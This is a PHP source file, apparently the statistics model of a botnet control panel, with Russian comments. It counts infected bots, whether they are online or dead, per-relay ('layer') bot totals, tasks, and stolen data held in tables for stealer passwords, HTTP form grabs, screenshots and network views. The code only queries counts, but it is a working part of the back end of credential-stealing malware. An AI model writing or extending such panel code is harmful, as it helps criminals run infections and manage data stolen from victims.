<?php

// TODO: Хардкод неоптимизированный. Обязательно переписать всю статистику, внедрить использование промежуточных таблиц с кэшированием.
class Model_Main extends Model
{
    public function get_data() { }

    public function getStats()
    {
        $stats = array();
        $stats['bots_stats'] = $this->getBotsMainStats();
        $stats['tasks_stats'] = $this->getTasksStats();
        $stats['reports_stats'] = $this->getReportsStats();
        $stats['layer_stats'] = $this->getLayersStats();
        return $stats;
    }

    private function getBotsMainStats()
    {
        $botStats = array();
        $settings = $this->getSettings();
        $knock_time = $settings['knock'] * 60;
        $lifetime = $settings['lifetime'] * 86400; // дни

        $botStats['bots_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots');
        $botStats['bots_online'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots WHERE last_login + :on > UNIX_TIMESTAMP()', array(':on' => $knock_time));
        $botStats['bots_dead'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots WHERE last_login + :on < UNIX_TIMESTAMP()', array(':on' => $lifetime));
        $botStats['bots_today'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots WHERE FROM_UNIXTIME(first_login, "%Y-%m-%d") = FROM_UNIXTIME(UNIX_TIMESTAMP(),"%Y-%m-%d")');
        return $botStats;
    }

    private function getTasksStats()
    {
        $tasksStats = array();
        $settings = $this->getSettings();
        $tasksStats['active_tasks'] = $settings['active_tasks'];
        $tasksStats['tasks_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM main_tasks');
        return $tasksStats;
    }

    private function getReportsStats()
    {
        $reportsStats = array();
        $reportsStats['screenshots_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM reports_screenshots');
        $reportsStats['screenshots_bots_count'] = $this->getDB()->queryValue('SELECT COUNT(DISTINCT bot_id) FROM reports_screenshots');

        $reportsStats['passwords_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM stealer_passwords');
        $reportsStats['passwords_bots_count'] = $this->getDB()->queryValue('SELECT COUNT(DISTINCT bot_id) FROM stealer_passwords');

        $reportsStats['forms_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM reports_http_grabber');
        $reportsStats['forms_bots_count'] = $this->getDB()->queryValue('SELECT COUNT(DISTINCT bot_id) FROM reports_http_grabber');

        $reportsStats['domains_count'] = $this->getDB()->queryValue('SELECT COUNT(id) FROM reports_netview_info');
        $reportsStats['domains_bots_count'] = $this->getDB()->queryValue('SELECT COUNT(DISTINCT bot_id) FROM reports_netview_info');
        return $reportsStats;
    }

    private function getLayersStats()
    {
        $layersStats = array();
        $settings = $this->getSettings();
        $lifetime = $settings['lifetime'] * 86400;
        $layers = $this->getDB()->queryRows('SELECT * FROM layers ORDER BY id DESC');
        foreach($layers as $layer)
        {
            $activeBots = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots WHERE layer_ip=:layer_ip AND last_login + :lifetime > UNIX_TIMESTAMP()',
                array(':lifetime' => $lifetime, ':layer_ip' => $layer['ip']));

            $totalBots = $this->getDB()->queryValue('SELECT COUNT(id) FROM bots WHERE layer_ip = :layer_ip',
                array(':layer_ip' => $layer['ip']));

            $layersStats[] = array('ip' => $layer['ip'], 'total_bots' => $totalBots, 'active_bots' => $activeBots);
        }
        return $layersStats;
    }
}